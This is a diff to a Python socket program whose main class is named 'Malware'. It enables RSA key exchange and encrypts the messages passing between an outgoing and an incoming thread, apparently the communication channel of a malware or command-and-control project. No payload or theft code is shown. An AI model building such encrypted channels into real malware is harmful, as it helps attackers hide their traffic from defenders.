@@ -37,7 +37,7 @@ class InThread(threading.Thread):
 
             self.conn, self.in_ip = self.socket.accept()
             print('Connection received from {} on port {}'.format(self.in_ip[0], self.in_ip[1]))
-            #self.init_public_key()
+            self.init_public_key()
         except socket.timeout:
             print('No response from {}'.format(self.ip))
         else:
@@ -46,7 +46,7 @@ class InThread(threading.Thread):
     def run(self):
         again = True
         while again:
-            msg = self.conn.recv(1024).decode('UTF-8')
+            msg = self.rsa_decrypt(self.conn.recv(1024)).decode('UTF-8')
             if msg == 'exit':
                 again = False
             else:
@@ -57,11 +57,11 @@ class InThread(threading.Thread):
         #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
 
-        print('Closed socket coming from {}:{}'.format(self.in_ip[0],self.in_ip[1]))
+        print('Closed socket coming from {}:{}'.format(self.in_ip[0], self.in_ip[1]))
 
     def init_public_key(self):
         try:
-            remote_public_key_pem = connection.recv(InThread.BUFFER_SIZE)
+            remote_public_key_pem = self.conn.recv(1024)
             global remote_public_key
             remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
             print("Remote public key successfully loaded")
@@ -93,7 +93,7 @@ class OutThread(threading.Thread):
         except ConnectionError:
             print('Unable to connect to {}'.format(self.ip))
 
-        #self.send_public_keys()
+        self.send_public_keys()
         self.start()
 
     def run(self):
@@ -132,7 +132,7 @@ class OutThread(threading.Thread):
 
     def send(self, message):
         try:
-            self.sock.sendall(message.encode('UTF-8'))
+            self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
 
@@ -162,13 +162,13 @@ class Malware():
 
         print("Trying to reach {} on port {}".format(self.ip, self.out_port))
 
-        self.cons = OutThread(self.ip, self.out_port)
-        self.prod = InThread(self.in_port)
-
         global private_key
         global public_key_pem
-        #private_key = self.generate_rsa_keys()
-        #public_key_pem = self.serialize_public_key(private_key.public_key())
+        private_key = self.generate_rsa_keys()
+        public_key_pem = self.serialize_public_key(private_key.public_key())
+
+        self.cons = OutThread(self.ip, self.out_port)
+        self.prod = InThread(self.in_port)
 
     def run(self):
         self.prod.start()
